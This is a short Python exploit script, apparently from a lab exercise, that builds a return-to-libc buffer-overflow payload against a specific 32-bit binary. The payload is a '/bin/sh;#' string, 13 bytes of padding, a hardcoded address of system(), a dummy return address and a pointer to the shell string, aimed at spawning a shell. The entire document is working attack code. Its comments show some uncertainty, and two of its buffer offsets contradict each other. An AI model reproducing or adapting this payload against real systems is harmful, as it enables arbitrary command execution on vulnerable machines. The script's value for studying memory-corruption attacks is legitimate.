from struct import pack
import sys

# step 1: overflow the buffer
# step 2: use buffer overflow to overwrite return address to addr of system() function
# step 3: execute system() function with bin sh as argument somehow?
	# somehow we'll need the addr of our shellcode on the top of the stack when we make that call

# system() address: 0x080518f0
# %ebp address    : 0xfffe7738
# command "echo Hello World" is stored at address: 0x080b6008.
	# this command gets passed as an argument to system
# buf[] starts at %ebp - 0x12 = 0xfffe7726
# buf[] ends up at %ebp - 0x32 = 0xfffe7706

binsh = b"/bin/sh;#"					# the ;# comments out other stuff

sys.stdout.buffer.write(binsh)				#arg to system
sys.stdout.buffer.write(b"A"*13)				#buf[] padding
sys.stdout.buffer.write(pack("<I", 0x080518f0))		#addr of system()
sys.stdout.buffer.write(pack("<I", 0xdeadbeef))		#dummy return addr for system()
sys.stdout.buffer.write(pack("<I", 0xfffe7706))		#addr of argument to system()


